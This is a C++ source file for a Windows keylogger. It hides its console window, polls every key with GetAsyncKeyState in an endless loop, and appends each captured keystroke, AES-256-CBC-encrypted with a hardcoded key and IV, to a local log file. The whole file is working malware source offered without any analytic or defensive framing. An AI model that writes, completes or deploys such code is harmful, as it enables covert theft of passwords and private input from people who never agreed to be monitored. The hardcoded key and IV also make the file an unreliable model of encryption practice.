#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>
#include "encryption.h"

const std::string AES_KEY = "12345678901234567890123456789012"; // 32-byte key
const std::string AES_IV  = "abcdefghijklmnop";                 // 16-byte IV
const std::string LOG_FILE = "keylog_cbc_encrypted.log";

void hideWindow() {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
}

std::string keyToString(int key) {
    if (key >= 'A' && key <= 'Z') return std::string(1, char(key));
    if (key >= '0' && key <= '9') return std::string(1, char(key));
    switch (key) {
        case VK_SPACE: return " ";
        case VK_RETURN: return "[ENTER]\n";
        case VK_BACK: return "[BACKSPACE]";
        case VK_TAB: return "[TAB]";
        case VK_SHIFT: return "[SHIFT]";
        case VK_CONTROL: return "[CTRL]";
        case VK_ESCAPE: return "[ESC]";
        default: return "";
    }
}

void logKeyEncrypted(const std::string& keyStr) {
    std::ofstream outFile(LOG_FILE, std::ios::app | std::ios::binary);
    if (outFile.is_open()) {
        std::string encrypted = aes256EncryptCBC(keyStr, AES_KEY, AES_IV);
        outFile.write(encrypted.c_str(), encrypted.size());
        outFile << "\n";
        outFile.close();
    }
}

int main() {
    hideWindow();
    while (true) {
        for (int key = 8; key <= 190; ++key) {
            if (GetAsyncKeyState(key) & 0x1) {
                std::string keyStr = keyToString(key);
                if (!keyStr.empty()) {
                    logKeyEncrypted(keyStr);
                }
            }
        }
        Sleep(10);
    }
    return 0;
}
